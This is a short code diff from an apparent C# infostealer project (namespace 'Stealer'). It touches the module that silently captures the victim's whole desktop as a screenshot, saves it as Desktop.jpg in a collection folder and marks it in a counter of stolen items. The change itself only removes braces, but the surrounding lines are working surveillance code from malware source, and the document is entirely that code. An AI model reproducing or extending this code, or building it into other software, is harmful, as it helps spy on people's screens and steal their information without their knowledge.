@@ -13,9 +13,7 @@ namespace Stealer
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                 {
                     using (Graphics g = Graphics.FromImage(bitmap))
-                    {
                         g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-                    }
                     bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
                 }
                 Counter.DesktopScreenshot = true;
